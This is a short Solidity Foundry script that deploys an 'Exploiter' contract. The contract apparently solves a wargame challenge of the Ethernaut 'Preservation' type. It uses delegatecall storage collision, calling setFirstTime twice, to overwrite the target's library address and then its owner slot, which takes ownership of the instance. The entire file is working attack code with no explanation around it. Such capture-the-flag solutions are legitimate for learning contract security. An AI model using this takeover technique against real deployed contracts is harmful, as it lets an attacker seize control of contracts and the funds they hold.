// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Deployer is Script {
    function run() external {
        vm.startBroadcast();
        new Exploiter();
        vm.stopBroadcast();
    }
}

contract Exploiter {
    address public slot0;
    address public slot1;
    address public slot3;
    address public immutable owner;

    constructor() {
        owner = msg.sender;
    }

    function exploit(address _instance) external {
        _instance.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(this)))));
        _instance.call(abi.encodeWithSignature("setFirstTime(uint256)", 0));
    }

    function setTime(uint256 /* _time */) public {
        slot3 = owner;
    }
}